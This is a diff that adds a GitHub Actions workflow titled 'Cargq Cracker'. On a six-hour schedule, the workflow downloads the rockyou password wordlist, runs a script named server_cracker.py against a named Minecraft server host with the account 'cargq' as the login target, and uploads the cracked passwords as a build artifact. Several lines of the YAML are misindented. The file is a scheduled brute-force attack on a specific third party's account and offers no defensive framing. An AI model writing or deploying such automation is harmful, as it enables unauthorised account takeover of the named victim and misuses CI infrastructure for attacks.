@@ -1,0 +1,34 @@
+name: Cargq Cracker
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 */6 * * *' # Run every 6 hours
+
+jobs:
+  crack:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Checkout
+    uses: actions/checkout@v4
+
+    - name: Setup Python
+    uses: actions/setup-python@v4
+    with:
+    python-version: '3.11'
+
+    - name: Download wordlist
+    run: wget https://github.com/brannondorsey/wordlists/raw/master/rockyou.txt --no-check-certificate
+
+    - name: Run Script
+    env:
+    MC_IP: nyvexsmp.playwithbao.com
+    LOGIN_TARGET: cargq
+   run: |
+    python3 server_cracker.py
+  
+    - name: Upload Passwords
+    uses: actions/upload-artifact@v4
+    with:
+    name: cracked_data
+    path: cracked_passwords.txt
